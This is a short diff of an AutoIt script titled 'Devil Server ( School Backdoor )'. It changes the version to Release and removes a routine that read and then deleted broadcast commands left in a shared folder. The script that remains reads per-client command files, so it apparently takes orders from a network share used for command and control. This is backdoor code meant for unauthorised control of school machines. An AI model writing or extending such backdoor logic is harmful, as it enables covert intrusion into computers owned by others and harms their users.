@@ -2,7 +2,7 @@
  
  Devil Server ( School Backdoor )
  AutoIt Version: 3.3.14.2
- Version: Beta 3 ( 20:55 11.09.2017)
+ Version: Release ( 19:45 12.09.2017)
 
 #ce ----------------------------------------------------------------------------
 
@@ -80,15 +80,6 @@ WEnd
 
 ; Get data from the shared folder
 Func ReadServer()
-	; Read public data
-	If FileExists($Config_ServerPatch & "\PublicData") Then
-		Local $Data[2]
-		$Data[0] = IniRead($Config_ServerPatch & "\PublicData", "Data", "Type", "")
-		$Data[1] = IniRead($Config_ServerPatch & "\PublicData", "Data", "Command", "")
-		Sleep($Config_Speed * 5)
-		FileDelete($Config_ServerPatch & "\PublicData")
-		Return $Data
-	EndIf
 
 	; Read data from server
 	If FileExists($Config_ServerPatch & "\" & $Config_ClientID) Then
